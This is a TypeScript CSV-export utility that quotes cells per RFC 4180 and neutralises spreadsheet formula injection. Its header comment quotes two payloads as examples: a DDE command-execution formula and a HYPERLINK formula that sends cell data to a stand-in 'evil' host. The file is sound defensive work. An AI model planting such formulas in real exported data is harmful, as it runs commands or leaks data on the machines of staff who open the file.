/**
 * CSV serialization that is safe to open in Excel / Google Sheets.
 *
 * Two separate problems are handled here:
 *
 * 1. CSV STRUCTURE — commas, quotes and newlines inside a value would break the
 *    row/column grid. Every cell is wrapped in double quotes with internal
 *    quotes doubled ("" ), the standard RFC 4180 escaping.
 *
 * 2. CSV FORMULA INJECTION — a spreadsheet treats any cell whose text begins
 *    with = + - @ (or a tab / carriage return) as a FORMULA, and will execute
 *    it on open. Our lead data is partly attacker-controlled: a name, email or
 *    "project" can arrive from a public microsite enquiry, a portal, or an
 *    import. A lead named `=cmd|'/c calc'!A1` or
 *    `=HYPERLINK("http://evil?"&A1,"click")` would then run on the staff
 *    member's machine when they open the export. Quoting the field does NOT stop
 *    this — Excel strips the quotes and still evaluates. The fix is to prefix any
 *    such cell with a single quote, which forces the spreadsheet to treat the
 *    whole value as literal text.
 *
 * Note: phone numbers begin with `+`, so they are prefixed too. That is
 * deliberate and harmless — the leading apostrophe is the spreadsheet's "this is
 * text" marker (it isn't shown in the cell) and it also stops Excel mangling the
 * number. Correctness beats the cosmetic cost.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/** Escape one cell: neutralise a leading formula trigger, then RFC-4180 quote. */
export function csvCell(value: unknown): string {
  let s = value == null ? '' : String(value);
  if (FORMULA_TRIGGER.test(s)) s = "'" + s;
  return '"' + s.replace(/"/g, '""') + '"';
}

/** Build a CSV document (with a trailing newline) from a matrix of rows. */
export function toCsv(rows: unknown[][]): string {
  return rows.map(r => r.map(csvCell).join(',')).join('\r\n') + '\r\n';
}

/** Serialize rows and hand the file to the browser as a download. */
export function downloadCsv(filename: string, rows: unknown[][]): void {
  const blob = new Blob([toCsv(rows)], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}
